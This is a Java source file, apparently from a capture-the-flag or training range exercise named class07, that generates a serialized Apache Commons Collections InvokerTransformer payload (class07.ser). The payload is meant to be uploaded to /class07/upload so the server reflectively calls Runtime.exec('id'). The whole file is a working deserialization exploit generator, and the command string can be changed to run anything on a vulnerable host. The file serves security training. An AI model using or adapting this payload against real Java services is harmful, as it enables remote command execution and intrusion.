package class07;

import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import com.ctfstu.common.Logger;

/**
 * 生成 class07 的 payload — InvokerTransformer
 * 目标: 上传 InvokerTransformer，靶场调用 t.transform(Runtime.getRuntime())
 *       触发反射调用 Runtime.exec("id")
 * 靶场: /class07/upload
 *
 * InvokerTransformer.transform(input):
 *   input.getClass().getMethod("exec", String.class).invoke(input, "id")
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Logger.setLogLevel(Logger.DEBUG);
        InvokerTransformer trans = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{"id"});

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("class07.ser"));
        oos.writeObject(trans);
        oos.close();

        System.out.println("✅ 已生成: class07.ser");
    }
}
